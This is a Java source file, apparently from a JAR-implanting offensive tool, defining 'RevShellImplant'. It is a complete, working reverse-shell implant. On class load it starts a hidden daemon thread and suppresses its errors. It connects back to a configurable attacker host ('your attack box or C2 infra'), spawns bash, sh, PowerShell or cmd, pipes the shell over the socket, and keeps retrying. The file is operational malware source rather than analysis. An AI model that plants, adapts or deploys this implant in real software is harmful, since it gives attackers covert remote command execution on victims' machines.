package io.github.w1th4d.jarplant.implants;

import java.io.Closeable;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandler {
    // Standard config fields from ClassImplant template:
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * Hostname, IPv4 address or IPv6 address to connect back to.
     * This should be your attack box or C2 infra.
     */
    static volatile String CONF_LHOST = "localhost";

    /**
     * TCP port number to use when connecting back.
     */
    static volatile int CONF_LPORT = 12345;

    /**
     * Timeout in seconds for each connection attempt.
     */
    static volatile int CONF_TIMEOUT_SECONDS = 30;

    /**
     * Amount of seconds to wait between connection attempts.
     */
    static volatile int CONF_RETRY_WAIT_SECONDS = 30;

    /**
     * Amount of seconds between TCP keep-alive probes.
     * This value will be used for the TCP_KEEPIDLE and TCP_KEEPINTERVAL socket options (if available).
     */
    static volatile int CONF_TCP_KEEPALIVE_SECONDS = 30;

    /**
     * Number of keep-alive probe attempts before considering the socket broken.
     * This value will be used for the TCP_KEEPCOUNT socket option (if available).
     */
    static volatile int CONF_TCP_KEEPALIVE_ATTEMPTS = 3;

    /**
     * Print debug output to stdout.
     * Setting this to false will make the implant completely quiet.
     */
    static volatile boolean CONF_DEBUG_OUTPUT = true;

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                RevShellImplant implant = new RevShellImplant();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    private void payload() {
        if (CONF_LHOST == null || CONF_LHOST.isEmpty()) {
            return;
        }

        Optional<Path> shellCommand = findShellExecutable();
        if (shellCommand.isEmpty()) {
            log("[!] Cannot find shell executable!");
            return;
        }

        while (!Thread.interrupted()) {
            log("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
            try (Socket connection = new Socket()) {
                setKeepAliveOptions(connection);
                connection.connect(new InetSocketAddress(CONF_LHOST, CONF_LPORT), (int) Duration.ofSeconds(CONF_TIMEOUT_SECONDS).toMillis());
                InputStream fromRemote = connection.getInputStream();
                OutputStream toRemote = connection.getOutputStream();
                log("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");

                String shellCommandExecStr = shellCommand.get().toAbsolutePath().toString();
                Process shell = new ProcessBuilder()
                        .command(shellCommandExecStr)
                        .redirectErrorStream(true)
                        .start();
                InputStream fromShell = shell.getInputStream();
                OutputStream toShell = shell.getOutputStream();
                log("[$] Shell '" + shellCommandExecStr + "' popped with PID " + shell.pid() + ".");

                Thread pipe1 = new Thread(() -> {
                    transfer(fromShell, toRemote);
                    log("[-] Shell terminated.");
                    closeAll(connection);
                    shell.destroy();
                });
                pipe1.start();

                Thread pipe2 = new Thread(() -> {
                    transfer(fromRemote, toShell);
                    log("[-] Connection terminated.");
                    closeAll(connection);
                    shell.destroy();
                });
                pipe2.start();

                log("[ ] Waiting...");
                pipe1.join();
                pipe2.join();
            } catch (SocketTimeoutException e) {
                log("[!] " + e.getClass().getName() + ": " + e.getMessage());
            } catch (IOException e) {
                log("[!] " + e.getClass().getName() + ": " + e.getMessage());
                log("[ ] Waiting for " + CONF_RETRY_WAIT_SECONDS + " seconds...");
                try {
                    Thread.sleep(Duration.ofSeconds(CONF_RETRY_WAIT_SECONDS).toMillis());
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                }
            } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            }
        }
    }

    @SuppressWarnings("unchecked")
    private static void setKeepAliveOptions(Socket socket) {
        try {
            socket.setKeepAlive(true);
        } catch (SocketException e) {
            log("[-] Socket does not support TCP keep-alive.");
        }

        for (SocketOption<?> option : socket.supportedOptions()) {
            // Time in seconds before the first keep-alive probe is sent.
            if (option.name().equals("TCP_KEEPIDLE") && option.type() == Integer.class) {
                try {
                    socket.setOption((SocketOption<Integer>) option, CONF_TCP_KEEPALIVE_SECONDS);
                } catch (Exception ignored) {
                }
            }

            // Amount of probes to send before considering the socket broken.
            if (option.name().equals("TCP_KEEPCOUNT") && option.type() == Integer.class) {
                try {
                    socket.setOption((SocketOption<Integer>) option, CONF_TCP_KEEPALIVE_ATTEMPTS);
                } catch (Exception ignored) {
                }
            }

            // Interval in seconds between each keep-alive probe retry.
            if (option.name().equals("TCP_KEEPINTERVAL") && option.type() == Integer.class) {
                try {
                    socket.setOption((SocketOption<Integer>) option, CONF_TCP_KEEPALIVE_SECONDS);
                } catch (Exception ignored) {
                }
            }
        }
    }

    /**
     * Transfer all data from one stream to another.
     * No string/text interpretation will be done. Just raw bytes.
     * This method blocks and returns only if the streams are closed, or the current thread is interrupted.
     *
     * @param input  from
     * @param output to
     */
    private static void transfer(InputStream input, OutputStream output) {
        byte[] buffer = new byte[256];
        while (!Thread.interrupted()) {
            try {
                int readAmount = input.read(buffer);
                if (readAmount == -1) {
                    break;
                }
                output.write(buffer, 0, readAmount);
                output.flush();
            } catch (IOException e) {
                break;
            }
        }
    }

    private static void closeAll(Closeable... closeables) {
        for (Closeable closeable : closeables) {
            try {
                closeable.close();
            } catch (IOException ignored) {
            }
        }
    }

    /**
     * Find the most preferred shell depending on the operating system and what's available.
     *
     * @return maybe a path to an executable file
     */
    private static Optional<Path> findShellExecutable() {
        String osName = System.getProperty("os.name").toLowerCase();
        if (osName.startsWith("windows")) {
            String pathEnv = System.getenv("PATH");
            return findWindowsShellExecutable(FileSystems.getDefault(), pathEnv);
        } else if (osName.startsWith("linux")) {
            return findUnixShellExecutable(FileSystems.getDefault());
        } else if (osName.startsWith("mac")) {
            return findUnixShellExecutable(FileSystems.getDefault());
        } else {
            return Optional.empty();
        }
    }

    // Separate method for testability.
    static Optional<Path> findUnixShellExecutable(FileSystem fs) {
        List<Path> candidates = Arrays.asList(
                fs.getPath("/bin/bash"),
                fs.getPath("/bin/zsh"),
                fs.getPath("/bin/sh")
        );
        for (Path candidate : candidates) {
            if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                return Optional.of(candidate);
            }
        }

        return Optional.empty();
    }

    // Separate method for testability.
    static Optional<Path> findWindowsShellExecutable(FileSystem fs, String pathEnv) {
        if (pathEnv == null || pathEnv.isEmpty()) {
            return Optional.empty();
        }

        Optional<Path> powershell = Optional.empty();
        Optional<Path> cmd = Optional.empty();

        // PowerShell can exist on some various paths depending on the version and how it was installed.
        // cmd is expected to always be in the same place, but do what Windows does and search the PATH for it.
        String[] binPaths = pathEnv.split(";");
        for (String binPath : binPaths) {
            Path path = fs.getPath(binPath);
            if (Files.exists(path) && Files.isDirectory(path)) {
                if (powershell.isEmpty()) {
                    Path candidate = path.resolve("powershell.exe");
                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                        powershell = Optional.of(candidate);
                    }
                }

                if (cmd.isEmpty()) {
                    Path candidate = path.resolve("cmd.exe");
                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                        cmd = Optional.of(candidate);
                    }
                }
            }
        }

        // PowerShell is preferred over cmd but cmd is better than nothing.
        if (powershell.isPresent()) {
            return powershell;
        } else if (cmd.isPresent()) {
            return cmd;
        } else {
            return Optional.empty();
        }
    }

    private static void log(String msg) {
        if (CONF_DEBUG_OUTPUT) {
            System.out.println(msg);
        }
    }

    public static void main(String[] args) {
        RevShellImplant implant = new RevShellImplant();
        implant.payload();
    }
}
